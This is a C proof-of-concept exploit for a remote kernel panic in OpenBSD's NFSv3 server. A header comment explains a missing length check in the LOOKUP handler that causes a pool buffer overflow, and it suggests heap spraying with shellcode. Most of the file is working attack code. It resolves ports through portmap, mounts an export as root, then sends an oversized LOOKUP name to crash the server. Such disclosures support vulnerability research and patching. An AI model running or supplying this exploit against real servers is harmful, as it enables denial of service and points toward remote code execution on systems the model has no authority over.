/*
 * What: OpenBSD NFSv3 Server Remote Panic LOOKUP name length control
 * Why: Why not?
 * When: Found many years ago, PoC written in August 2024
 * Version: 1.0
 * Author: Claes M Nyberg <cmn@signedness.org>
 * Compile: gcc -Wall -pedantic -o OpenBSD-NFSv3-Server-LOOKUP-Len OpenBSD-NFSv3-Server-LOOKUP-Len.c
 *
 * Copyright (C)  2023-2024 Claes M Nyberg <cmn@signedness.org>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Claes M Nyberg.
 * 4. The name Claes M Nyberg may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

 /*
 \ OpenBSD suffers from lack of validation of the length variable when processing the 
 / NFSv3 LOOKUP Call, resulting in a pool(9) (heap) buffer overflow.
 \ Verified Releases: 7.5 amd64, 7.2 amd64, 6.0 amd64, 5.6 amd64, 5.0 amd64
 /
 \
 / While processing the NFSv3 LOOKUP Call, the function nfs_namei, located at sys/nfs/nfs_subs.c:1178 is called.
 \ In this call we control the variable len, which is the LOOKUP Call length variable, and the fromcp variable
 / which points to the name in the LOOKUP Call. The result is that we control how many bytes (32bit) that are
 \ copied from the name, i.e. fromcp into the pool buffer tocp returned from pool_get() on line 1191.
 / The pool is initiated with MAXPATHLEN buffers, which is 1024 on OpenBSD 7.2.
 \ sys/nfs/nfs_subs.c
 / 1178    int
 \ 1179    nfs_namei(struct nameidata *ndp, fhandle_t *fhp, int len,
 / 1180        struct nfssvc_sock *slp, struct mbuf *nam, struct mbuf **mdp,
 \ 1181        caddr_t *dposp, struct vnode **retdirp, struct proc *p)
 / 1182    {
 \ 1183            int i, rem;
 / 1184            struct mbuf *md;
 \ 1185            char *fromcp, *tocp;
 / 1186            struct vnode *dp;
 \ 1187            int error, rdonly;
 / 1188            struct componentname *cnp = &ndp->ni_cnd;
 \ 1189
 / 1190            *retdirp = NULL;
 \ 1191            cnp->cn_pnbuf = pool_get(&namei_pool, PR_WAITOK);
 / 1192             *
 \ 1193             * Copy the name from the mbuf list to ndp->ni_pnbuf
 / 1194             * and set the various ndp fields appropriately.
 \ 1195             *
 / 1196            fromcp = *dposp;
 \ 1197            tocp = cnp->cn_pnbuf;
 / 1198            md = *mdp;
 \ 1199            rem = mtod(md, caddr_t) + md->m_len - fromcp;
 / 1200            for (i = 0; i < len; i++) {
 \ 1201                    while (rem == 0) {
 / 1202                            md = md->m_next;
 \ 1203                            if (md == NULL) {
 / 1204                                    error = EBADRPC;
 \ 1205                                    goto out;
 / 1206                            }
 \ 1207                            fromcp = mtod(md, caddr_t);
 / 1208                            rem = md->m_len;
 \ 1209                    }
 / 1210                    if (*fromcp == '\0' || *fromcp == '/') {
 \ 1211                            error = EACCES;
 / 1212                            goto out;
 \ 1213                    }
 / 1214                    *tocp++ = *fromcp++;
 \ 1215                    rem--;
 \ 1216            }
 / 1217            *tocp = '\0';
 \ 1218            *mdp = md;
 / 1219            *dposp = fromcp;
 \ 1220            len = nfsm_padlen(len);
 / 1221            if (len > 0) {
 \ 1222                    if (rem >= len)
 / 1223                            *dposp += len;
 \ 1224                    else if ((error = nfs_adv(mdp, dposp, len, rem)) != 0)
 / 1225                            goto out;
 \ 1226            }
 /
 \
 / Further on, pool buffers uses canary values (which was using a static value
 \ up to version 5.6, check out subr_poison.c) in between which causes an 8 byte overflow to
 / raise a panic while the pool is traversed in pool_p_free or pool_do_get in kern/subr_pool.c,
 \ causing this bug to require a leak of the canary before even attempting to exploit in later
 / versions.
 \
 / An interesting observation though, is that pool buffer need the PR_ZERO flag to be set
 \ when calling pool_get() to zero out the buffer.
 /       if (ISSET(flags, PR_ZERO))
 \       memset(v, 0, pp->pr_size);
 /
 \ This is not set by the NFS server, making pool buffers available for heap spraying
 / by flooding with LOOKUP Calls that fill the buffers with shellcode to the maximum of 1024 bytes,
 \ increasing the probability to hit valid code in a jmp/call instruction.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>

#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* Global configuration */
struct conf {
	char *server;
	uint32_t server_ip;
} cfg;


/* Local routines */
static ssize_t udp_sendto(int, uint32_t, uint16_t, uint8_t *, size_t);
static ssize_t udp_recv(int, uint32_t, uint16_t, uint8_t *, size_t);
static uint16_t portmap_getport(int, uint32_t, uint32_t);
static int mount(int, uint32_t, uint16_t, uint8_t **);
static int udp_socket(uint32_t, uint16_t);
static int nfs_client(struct conf *);

#ifndef PROTO_UDP
#define PROTO_UDP 17
#endif

struct rpc_call {
	uint32_t xid;
	uint32_t msgtype;
	#define RPC_MSG_TYPE_CALL	0
	#define RPC_MSG_TYPE_REPLY	1

	uint32_t version;
	uint32_t program;
	#define RPC_PROGRAM_PORTMAP	100000
	#define RPC_PROGRAM_NFS		100003
	#define RPC_PROGRAM_MOUNT	100005

	uint32_t program_version;
	uint32_t procedure;
	#define RPC_NFS_PROCEDURE_LOOKUP	3
	#define RPC_NFS_PROCEDURE_MKDIR		9
	#define RPC_PORTMAP_PROCEDURE_GETPORT	3
	#define RPC_MOUNT_PROCEDURE_MNT	1

} __attribute__((packed));	

struct rpc_reply {
	uint32_t xid;
	uint32_t msgtype;
	uint32_t reply_state;
		#define RPC_ACCEPTED 0
} __attribute__((packed));


#define RPC_EXEC_SUCCESS 0

struct rpc_creds {
	uint32_t flavor;
	#define FLAVOR_AUTH_UNIX	1
	uint32_t length;
};

struct rpc_verifier {
	uint32_t flavor;
	uint32_t length;
};

struct portmap_getport_call {
	uint32_t program;
	uint32_t version;
	uint32_t proto;
	uint32_t port;
} __attribute__((packed));


/*
 * Send mount command to NFS server (hardcoded export).
 * Returns the length of the file handle on succes, -1 on error.
 */
int
mount(int sock, uint32_t server_ip, uint16_t port, uint8_t **fh)
{
#define MACHINE_NAME "svartove.laptop"
	struct {
		struct rpc_call r;
		struct rpc_creds c;
		uint32_t stamp;
		uint32_t machine_name_len;
		uint8_t machine_name[16];
		uint32_t uid;
		uint32_t gid;
		uint32_t auxgids;
		struct rpc_verifier v;

		uint32_t pathlen;
		uint8_t path[16];

	} __attribute__((packed)) mount;
	struct {
		struct rpc_reply r;
		struct rpc_verifier v;
		uint32_t accept_state;

		uint32_t status;
		#define MOUNT_STATUS_OK	0

		uint32_t flen;
		uint8_t fhandle[28];

		uint32_t flavors;
		uint32_t flavor;
	} __attribute__((packed)) mount_reply;
	ssize_t len;
    uint32_t xid;
	memset(&mount, 0x00, sizeof(mount));

    xid = rand();
	printf("Generated XID 0x%08x\n", xid);

    mount.r.xid = htonl(xid);
    mount.r.msgtype = htonl(RPC_MSG_TYPE_CALL);
    mount.r.version = htonl(2);
    mount.r.program = htonl(RPC_PROGRAM_MOUNT);
    mount.r.program_version = htonl(3);
    mount.r.procedure = htonl(RPC_MOUNT_PROCEDURE_MNT);

	mount.c.flavor = htonl(FLAVOR_AUTH_UNIX);
	mount.c.length = htonl(36);
	mount.stamp = ntohl(0x349ad411);
	mount.machine_name_len = htonl(16);
	memcpy(mount.machine_name, MACHINE_NAME, 16);
	mount.uid = htonl(0);
	mount.gid = htonl(0);
	mount.auxgids = htonl(0);

	mount.v.flavor = htonl(0);
	mount.v.length = htonl(0);

	#define MNTPOINT "/nfs"
	mount.pathlen = htonl(sizeof(MNTPOINT)-1);
	memcpy(&mount.path, MNTPOINT, sizeof(MNTPOINT)-1);


    if (udp_sendto(sock, server_ip, port, 
            (uint8_t *)&mount, sizeof(mount)) < 0) {
        return -1;
    }

mnt_recv_reply:
    if ( (len = udp_recv(sock, server_ip, port, 
            (uint8_t *)&mount_reply, sizeof(mount_reply))) < sizeof(mount_reply)) {
        fprintf(stderr, "** Error: Bad length (%ld) of received data\n", len);
        return -1;
    }

    if (ntohl(mount_reply.r.xid) != xid) {
        fprintf(stderr, "** Warning: Recevied bad XID, got %08x, expected %08x\n",
            mount_reply.r.xid, htonl(xid));
        goto mnt_recv_reply;
    }

    if (ntohl(mount_reply.r.msgtype) != RPC_MSG_TYPE_REPLY) {
        fprintf(stderr, "** Warning: Did not receive Reply response, ignoring\n");
        goto mnt_recv_reply;
    }

    if (ntohl(mount_reply.r.reply_state) != RPC_ACCEPTED) {
        fprintf(stderr, "** Error: RPC reply state not accepted\n");
        return -1;
    }

    if (ntohl(mount_reply.accept_state) != RPC_EXEC_SUCCESS) {
        fprintf(stderr, "** Error: RPC exec failed\n");
        return -1;
	}

    if (ntohl(mount_reply.status) != MOUNT_STATUS_OK) {
        fprintf(stderr, "** Error: RPC exec failed\n");
        return -1;
	}

	if (fh != NULL) {
		int flen = ntohl(mount_reply.flen);

		if ( (*fh = malloc(flen)) == NULL) {
			fprintf(stderr, "** Error: Failed to allocate %d bytes\n", flen);
			return -1;
		}

		memcpy(*fh, mount_reply.fhandle, flen);
	}

	return ntohl(mount_reply.flen);
}


/*
 * Send the GETPORT Call to portmap for specific program.
 * Returns the port number in network byte order on success, 0 on error.
 */
uint16_t
portmap_getport(int sock, uint32_t server_ip, uint32_t rpc_program)
{
    struct {
        struct rpc_call r;
        struct rpc_creds c; 
        struct rpc_verifier v;
        struct portmap_getport_call gp;
    } __attribute__((packed)) getport;

    struct {
        struct rpc_reply r; 
        struct rpc_verifier v;
        uint32_t accept_state;
        uint32_t port;
    } __attribute__((packed)) getport_reply;

    uint32_t xid;
    ssize_t len;
    memset(&getport, 0x00, sizeof(getport));
    memset(&getport_reply, 0x00, sizeof(getport_reply));

    xid = rand();
	printf("Generated XID 0x%08x\n", xid);

    getport.r.xid = htonl(xid);
    getport.r.msgtype = htonl(RPC_MSG_TYPE_CALL);
    getport.r.version = htonl(2);
    getport.r.program = htonl(RPC_PROGRAM_PORTMAP);
    getport.r.program_version = htonl(2);
    getport.r.procedure = htonl(RPC_PORTMAP_PROCEDURE_GETPORT);

    getport.c.flavor = htonl(0);
    getport.c.length = htonl(0);
    getport.v.flavor = htonl(0);
    getport.v.length = htonl(0);

    getport.gp.program = htonl(rpc_program);
    getport.gp.version = htonl(3);
    getport.gp.proto = htonl(PROTO_UDP);
    getport.gp.port = htonl(0);

    if (udp_sendto(sock, server_ip, htons(111), 
            (uint8_t *)&getport, sizeof(getport)) < 0) {
        return 0;
    }

pmap_recv_reply:
    if ( (len = udp_recv(sock, server_ip, htons(111), 
            (uint8_t *)&getport_reply, sizeof(getport_reply))) < sizeof(getport_reply)) {
        fprintf(stderr, "** Error: Bad length (%ld) of received data\n", len);
        return 0;
    }

    if (ntohl(getport_reply.r.xid) != xid) {
        fprintf(stderr, "** Warning: Recevied bad XID, got %08x, expected %08x\n",
            getport_reply.r.xid, htonl(xid));
        goto pmap_recv_reply;
    }

    if (ntohl(getport_reply.r.msgtype) != RPC_MSG_TYPE_REPLY) {
        fprintf(stderr, "** Warning: Did not receive Reply response, ignoring\n");
        goto pmap_recv_reply;
    }

    if (ntohl(getport_reply.r.reply_state) != RPC_ACCEPTED) {
        fprintf(stderr, "** Error: RPC reply state not accepted\n");
        return 0;
    }

    if (ntohl(getport_reply.accept_state) != RPC_EXEC_SUCCESS) {
        fprintf(stderr, "** Error: RPC exec failed\n");
        return 0;
    }

    return htons(ntohl(getport_reply.port));
}


/*
 * Receive data from server.
 * Returns the length of data on success, -1 on error.
 */
ssize_t
udp_recv(int sock, uint32_t ip, uint16_t port, uint8_t *buf, size_t buflen)
{
	ssize_t len;
	struct sockaddr_in sa;
	socklen_t addrlen;

	memset(&sa, 0x00, sizeof(struct sockaddr_in));
	sa.sin_addr.s_addr = ip;
	sa.sin_port = port;
	addrlen = sizeof(struct sockaddr_in);	

	if ( (len = recvfrom(sock, buf, buflen, 0, (struct sockaddr *)&sa, &addrlen)) == -1) {
		fprintf(stderr, "** Error: recvfrom() failed: %s\n", strerror(errno));
		return -1;
	}

	return len;
}

/*
 * Send UDP datagram to server.
 * On success, the length of the response is returned.
 * IP and port in network byte order.
 */
ssize_t
udp_sendto(int sock, uint32_t ip, uint16_t port, uint8_t *buf, size_t buflen)
{
	struct sockaddr_in da;
	socklen_t addrlen;

	memset(&da, 0x00, sizeof(struct sockaddr_in));
	da.sin_addr.s_addr = ip;
	da.sin_port = port;
	addrlen = sizeof(struct sockaddr_in);

	if (sendto(sock, buf, buflen, 0, (struct sockaddr *)&da, addrlen) < 0) {
		fprintf(stderr, "** Error: sendto() failed: %s\n", strerror(errno));
		return -1;
	}

	return 0;
}

#define BYTETABLE \
	"................................."\
	"!\"#$%&'()*+,-./0123456789:;<=>?@"\
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`"\
	"abcdefghijklmnopqrstuvwxyz{|}~..."\
	"................................."\
	"................................."\
	"................................."\
	"..........................."


/*
 * Trigger vulnerability
 */
int
trigger(int sock, uint32_t server_ip, uint16_t port_nfs, uint8_t *fhandle)
{
	struct {
		struct rpc_call r;
		struct rpc_creds c;

		uint32_t stamp;
		uint32_t machine_name_len;
		uint32_t uid;
		uint32_t gid;
		uint32_t auxgids;
		uint32_t gids[7];
		struct rpc_verifier v;

		uint32_t len;
		uint8_t fh[28];

		uint32_t namelen;
		uint8_t data[1024];

	} __attribute__((packed)) lookup_call;

	uint32_t xid;
    memset(&lookup_call, 0x00, sizeof(lookup_call));

    xid = rand();
    printf("Generated XID 0x%08x\n", xid);

    lookup_call.r.xid = htonl(xid);
    lookup_call.r.msgtype = htonl(RPC_MSG_TYPE_CALL);
    lookup_call.r.version = htonl(2);
    lookup_call.r.program = htonl(RPC_PROGRAM_NFS);
    lookup_call.r.program_version = htonl(3);
    lookup_call.r.procedure = htonl(RPC_NFS_PROCEDURE_LOOKUP);

	lookup_call.c.flavor = htonl(FLAVOR_AUTH_UNIX);
	lookup_call.c.length = htonl(48);
	lookup_call.stamp = htonl(0);

	lookup_call.machine_name_len = htonl(0);
	lookup_call.uid = htonl(0);
	lookup_call.gid = htonl(0);
	
	lookup_call.auxgids = htonl(7);
	lookup_call.gids[0] = htonl(0);
	lookup_call.gids[1] = htonl(2);
	lookup_call.gids[2] = htonl(3);
	lookup_call.gids[3] = htonl(4);
	lookup_call.gids[4] = htonl(5);
	lookup_call.gids[5] = htonl(20);
	lookup_call.gids[6] = htonl(31);

	lookup_call.v.flavor = 0;
	lookup_call.v.length = 0;

	lookup_call.len = htonl(28);
	memcpy(lookup_call.fh, fhandle, 28);

	lookup_call.namelen = htonl(0xffff);
	memset(lookup_call.data, 0x41, sizeof(lookup_call.data));


    if (udp_sendto(sock, server_ip, port_nfs,
            (uint8_t *)&lookup_call, sizeof(lookup_call)) < 0) {
        return 0;
    }

	return 0;
}


/*
 * Execute the NFS client
 */
int
nfs_client(struct conf *cfg)
{
	int sock;
	uint16_t port_nfs;
	uint16_t port_mount;
	uint8_t *fh;
	int flen;
	int i;

	if ( (sock = udp_socket(0, htons(906))) < 0) {
		fprintf(stderr, "Failed to create UDP socket: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	/* Resolve NFS program port */
	printf("Resolving NFS port from portmap at %s\n", cfg->server);
	if ( (port_nfs = portmap_getport(sock, cfg->server_ip, RPC_PROGRAM_NFS)) == 0) {
		return -1;
	}
	printf("NFS located at UDP port %u\n", ntohs(port_nfs));

	/* Resolve mount program port */
	printf("Resolving mount port from portmap at %s\n", cfg->server);
	if ( (port_mount = portmap_getport(sock, cfg->server_ip, RPC_PROGRAM_MOUNT)) == 0) {
		return -1;
	}
	printf("Mount located at UDP port %u\n", ntohs(port_mount));

	printf("Mounting export from %s\n", cfg->server);
	if ( (flen = mount(sock, cfg->server_ip, port_mount, &fh)) < 0) {
		return -1;
	}

	if (fh == NULL) {
		fprintf(stderr, "** Error: Received NULL file handle\n");
		return -1;
	}

	printf("Received file handle (%d bytes): ", flen);
	for (i=0; i < flen; i++) {
		printf("%02x", fh[i]);
	}
	printf("\n");

	printf("Attempt to trigger vuln\n");
	if (trigger(sock, cfg->server_ip, port_nfs, fh) < 0) {
		return -1;
	}

	printf("Done.\n");
	return 0;
}

/*
 * Create UDP socket and bind to address.
 * IP and port in network byte order.
 * Returns a socket descriptor on success, -1 on error;
 */
int
udp_socket(uint32_t ip, uint16_t port)
{
	int sock;
	struct sockaddr_in usin;

	if ( (sock = socket(PF_INET, SOCK_DGRAM, 0)) < 0)
		return(-1);

	memset(&usin, 0x00, sizeof(usin));
	usin.sin_family = PF_INET;
	usin.sin_addr.s_addr = ip;
	usin.sin_port = port;

	if (bind(sock, (struct sockaddr *)&usin, sizeof(usin)) < 0) {
		close(sock);
		return(-1);
	}

	return(sock);
}



/*
 * Translate hostname or dotted decimal host address
 * into a network byte ordered IP address.
 * Returns -1 on error.
 */
long
net_inetaddr(const char *host)
{
	long haddr;
	struct hostent *hent;

	if ( (haddr = inet_addr(host)) == -1) {
		if ( (hent = gethostbyname(host)) == NULL)
			return(-1);
		memcpy(&haddr, (hent->h_addr), sizeof(haddr));
	}

	return(haddr);
}


void
usage(char *pname)
{
	printf("Usage: %s <nfs-server-addr>\n", pname);
	exit(EXIT_FAILURE);
}


int
main(int argc, char **argv)
{
	if (argc != 2)
		usage(argv[0]);

	cfg.server = argv[1];
	if ( (cfg.server_ip = net_inetaddr(argv[1])) == -1) {
		fprintf(stderr, "Failed to resolve server IP %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	srand(time(NULL));
	return nfs_client(&cfg);
}
